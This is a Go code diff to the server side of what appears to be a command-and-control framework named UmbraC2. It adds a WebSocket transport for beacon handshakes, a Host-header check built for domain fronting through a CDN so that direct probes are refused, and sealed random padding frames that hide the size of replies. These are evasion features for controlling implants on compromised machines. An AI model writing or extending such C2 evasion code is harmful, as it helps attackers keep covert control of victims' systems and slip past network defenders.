@@ -2,6 +2,7 @@ package link
 
 import (
 	"context"
+	"crypto/rand"
 	"encoding/hex"
 	"fmt"
 	"io"
@@ -13,6 +14,7 @@ import (
 	"time"
 
 	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
+	"github.com/thesyntax1/UmbraC2/server/internal/session"
 	"github.com/thesyntax1/UmbraC2/server/internal/wire"
 )
 
@@ -57,7 +59,18 @@ func (s *Server) httpHandler() http.Handler {
 }
 
 // handleBeaconHandshake handles the bootstrap POST: HELLO in, HELLO_ACK out.
+//
+// A request that asks for a WebSocket upgrade is served by the WebSocket
+// transport instead: the same protocol, but every frame travels in a binary
+// WebSocket frame.
 func (s *Server) handleBeaconHandshake(w http.ResponseWriter, r *http.Request) {
+	if isWebSocketUpgrade(r) {
+		s.handleBeaconWebSocket(w, r)
+		return
+	}
+	if !s.checkHostHeader(w, r) {
+		return
+	}
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
 		return
@@ -113,7 +126,9 @@ func (s *Server) handleBeaconHandshake(w http.ResponseWriter, r *http.Request) {
 	s.httpSessions[sid] = &httpSession{link: link, agentID: rec.ID, suite: info.Suite, last: time.Now()}
 	s.httpMu.Unlock()
 
-	writeFrames(w, [][]byte{out.Bytes()})
+	// The HELLO_ACK is sealed with the bootstrap session, so it cannot be
+	// padded with the session of the link; it is a fixed size anyway.
+	s.writeFrames(w, [][]byte{out.Bytes()})
 	s.Log.Info("http agent registered", "agent", rec.ID, "peer", addr, "sid", sid)
 }
 
@@ -123,6 +138,9 @@ func (s *Server) handleBeaconHandshake(w http.ResponseWriter, r *http.Request) {
 const maxFramesPerRequest = 16
 
 func (s *Server) handleBeaconFrame(w http.ResponseWriter, r *http.Request) {
+	if !s.checkHostHeader(w, r) {
+		return
+	}
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
 		return
@@ -181,6 +199,17 @@ func (s *Server) handleBeaconFrame(w http.ResponseWriter, r *http.Request) {
 			break
 		}
 	}
+	// The padding is sealed with the session of the link, so it has to
+	// happen under the same lock: the nonce counter must stay in order.
+	if handleErr == nil {
+		agent := hs.link
+		padded, err := s.padFrames(agent.Session, out)
+		if err != nil {
+			s.Log.Warn("http padding failed", "err", err)
+		} else {
+			out = padded
+		}
+	}
 	hs.mu.Unlock()
 
 	if handleErr != nil {
@@ -189,17 +218,37 @@ func (s *Server) handleBeaconFrame(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "bad frame", http.StatusBadRequest)
 		return
 	}
-	writeFrames(w, out)
+	s.writeFrames(w, out)
 	if closed {
 		s.dropHTTPSession(sid)
 	}
+}
+
+// checkHostHeader enforces the Host header the beacon is expected to send.
+//
+// With domain fronting the beacon names a fronting domain in the Host
+// header while it talks to a CDN.  The origin then only accepts requests
+// that carry exactly that name, so a request that reached the server
+// directly is refused instead of being answered.
+func (s *Server) checkHostHeader(w http.ResponseWriter, r *http.Request) bool {
+	want := s.Cfg.Server.HTTPHostHeader
+	if want == "" {
+		return true
+	}
+	if r.Host != want {
+		s.Log.Warn("http request with an unexpected host header",
+			"peer", clientIP(r), "host", r.Host, "expected", want)
+		http.Error(w, "unknown host", http.StatusMisdirectedRequest)
+		return false
+	}
+	return true
 }
 
 // writeFrames sends the reply frames as one body with an explicit
 // Content-Length. Without it Go falls back to chunked framing for bodies over a
 // couple of KiB, and a chunked body can only be delimited by closing the
 // connection — which defeats HTTP keep-alive on the beacon side.
-func writeFrames(w http.ResponseWriter, frames [][]byte) {
+func (s *Server) writeFrames(w http.ResponseWriter, frames [][]byte) {
 	total := 0
 	for _, f := range frames {
 		total += len(f)
@@ -212,6 +261,74 @@ func writeFrames(w http.ResponseWriter, frames [][]byte) {
 			return
 		}
 	}
+}
+
+// padFrames appends a padding frame that rounds the body up to a bucket.
+//
+// When http_pad is set, the length of a reply no longer tells how much work
+// it carried.  The padding is an ordinary sealed PADDING frame with a random
+// body, so the receiver ignores it like any other padding.
+func (s *Server) padFrames(sess *session.Session, frames [][]byte) ([][]byte, error) {
+	pad := s.Cfg.Server.HTTPPad
+	if pad <= 0 || len(frames) == 0 {
+		return frames, nil
+	}
+	total := 0
+	for _, f := range frames {
+		total += len(f)
+	}
+	frame, ok, err := paddingFrame(sess, total, pad)
+	if err != nil || !ok {
+		return frames, err
+	}
+	return append(frames, frame), nil
+}
+
+// paddingFrame seals a PADDING frame that rounds a body of `total` bytes up
+// to a multiple of `pad`.
+//
+// The size of the frame depends on the length prefix of its body, so the
+// length is solved for instead of guessed: the body is a binary value, and
+// its encoding is one tag byte, a uvarint length and the bytes themselves.
+func paddingFrame(sess *session.Session, total, pad int) ([]byte, bool, error) {
+	if pad <= 0 || total <= 0 {
+		return nil, false, nil
+	}
+	// The fixed part of a frame: prelude, nonce, the upk tag of the body and
+	// the authentication tag.
+	const overhead = wire.HeaderLen + wire.TagLen + 1
+	target := ((total + overhead + pad - 1) / pad) * pad
+	for prefix := 1; prefix <= 3; prefix++ {
+		length := target - total - overhead - prefix
+		if length < 0 {
+			continue
+		}
+		if uvarintLen(uint64(length)) != prefix {
+			continue
+		}
+		body := make([]byte, length)
+		if _, err := rand.Read(body); err != nil {
+			return nil, false, err
+		}
+		frame, err := sess.Encrypt(wire.MsgPadding, body)
+		if err != nil {
+			return nil, false, err
+		}
+		if total+len(frame) == target {
+			return frame, true, nil
+		}
+	}
+	return nil, false, nil
+}
+
+// uvarintLen is the number of bytes an uvarint of n occupies.
+func uvarintLen(n uint64) int {
+	size := 1
+	for n >= 0x80 {
+		n >>= 7
+		size++
+	}
+	return size
 }
 
 // dropHTTPSession forgets a session and marks the agent offline, so a link
